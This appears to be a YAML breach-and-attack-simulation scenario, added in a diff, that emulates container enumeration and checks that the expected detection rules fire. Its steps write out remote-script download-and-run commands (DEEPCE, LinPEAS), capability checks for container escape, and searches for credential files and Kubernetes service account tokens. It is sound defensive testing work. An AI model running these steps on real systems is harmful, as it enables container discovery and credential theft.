@@ -1,0 +1,129 @@
+scenario_id: SIM-CDR-001
+name: "Container Enumeration via DEEPCE"
+version: "1.0"
+status: active
+
+plane: CDR
+detection_types:
+  - BIOC
+  - Analytics
+
+uc_ref: UCS-CDR-01
+tc_ref: TC-CDR-01
+uc_name: "Container Runtime Threat Detection"
+tc_name: "Container Enumeration and Discovery"
+
+mitre_tactic: "TA0007"
+mitre_tactic_name: "Discovery"
+mitre_technique: "T1613"
+mitre_technique_name: "Container and Resource Discovery"
+additional_techniques:
+  - technique: "T1082"
+    name: "System Information Discovery"
+
+threat_report: "Unit42 - Hildegard: New TeamTNT Cryptojacking Malware Targeting Kubernetes"
+threat_report_url: "https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/"
+
+execution_identity:
+  default: container-runtime
+  options:
+    - container-runtime
+    - root
+    - www-data
+
+push_supported: true
+pull_supported: true
+
+external_tools:
+  - name: deepce
+    source: "https://github.com/stealthcopter/deepce"
+    type: script
+    install_inline: true
+  - name: linpeas
+    source: "https://github.com/carlospolop/PEASS-ng"
+    type: script
+    install_inline: true
+
+steps:
+  - id: step-01
+    name: "Install enumeration dependencies"
+    command: |
+      apt-get update -qq && apt-get install -y --no-install-recommends curl wget 2>/dev/null || \
+      apk add --no-cache curl wget 2>/dev/null || \
+      yum install -y curl wget 2>/dev/null; \
+      echo "[*] Dependency install complete"
+    identity: container-runtime
+    mitre_technique: "T1059.004"
+    expected_detections:
+      - plane: CDR
+        type: Analytics
+        description: "Package manager execution inside running container — unusual install pattern indicates post-exploitation activity"
+
+  - id: step-02
+    name: "Download and execute DEEPCE container enumeration tool"
+    command: "curl -sSL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o /tmp/deepce.sh && chmod +x /tmp/deepce.sh && bash /tmp/deepce.sh -nc 2>&1 | tee /tmp/deepce_output.txt"
+    identity: container-runtime
+    mitre_technique: "T1613"
+    expected_detections:
+      - plane: CDR
+        type: BIOC
+        description: "DEEPCE container enumeration script execution — known tool signature matched by CDR BIOC rule"
+      - plane: CDR
+        type: Analytics
+        description: "Suspicious curl download followed by bash execution in container context (curl-pipe-bash pattern)"
+
+  - id: step-03
+    name: "Check for privileged container escape vectors"
+    command: "ls -la /dev/ | head -30 && echo '---' && cat /proc/1/status | grep -E 'CapEff|CapPrm' && echo '---' && mount | grep -E 'overlay|docker|k8s' && echo '---' && env | grep -iE 'kube|docker|container'"
+    identity: container-runtime
+    mitre_technique: "T1613"
+    expected_detections:
+      - plane: CDR
+        type: BIOC
+        description: "Container privileged mode enumeration — /proc/1/status capability read indicating escape preparation"
+      - plane: CDR
+        type: Analytics
+        description: "Suspicious device enumeration and capability inspection sequence in container"
+
+  - id: step-04
+    name: "Enumerate mounted secrets and service account tokens"
+    command: "find / -name 'token' -o -name '*.pem' -o -name '*.key' 2>/dev/null | grep -v proc | head -20 && ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null && cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | cut -c1-50 && echo '[truncated for safety]'"
+    identity: container-runtime
+    mitre_technique: "T1552.001"
+    expected_detections:
+      - plane: CDR
+        type: BIOC
+        description: "Service account token access from within container — credential harvesting behavior"
+      - plane: CDR
+        type: Analytics
+        description: "Broad filesystem credential search pattern (find / -name token) in container context"
+
+  - id: step-05
+    name: "Download and run LinPEAS for comprehensive container privilege escalation check"
+    command: "curl -sSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && timeout 60 bash /tmp/linpeas.sh -q 2>&1 | grep -E 'CVE|docker|container|cgroup|escape' | tee /tmp/linpeas_cdr_output.txt"
+    identity: container-runtime
+    mitre_technique: "T1082"
+    expected_detections:
+      - plane: CDR
+        type: BIOC
+        description: "LinPEAS execution in container — post-exploitation privilege escalation tool signature"
+      - plane: CDR
+        type: Analytics
+        description: "Multiple system enumeration commands executed in sequence — automated discovery behavior"
+
+cleanup:
+  commands:
+    - "rm -f /tmp/deepce.sh /tmp/deepce_output.txt /tmp/linpeas.sh /tmp/linpeas_cdr_output.txt"
+    - "echo '[CortexSim] SIM-CDR-001 cleanup complete'"
+  k8s_teardown: "kubectl delete -f {manifest_path}"
+
+author: "Henry Reed"
+created: "2026-04-12"
+last_updated: "2026-04-12"
+tags:
+  - container-security
+  - enumeration
+  - deepce
+  - linpeas
+  - cloud-native
+  - discovery
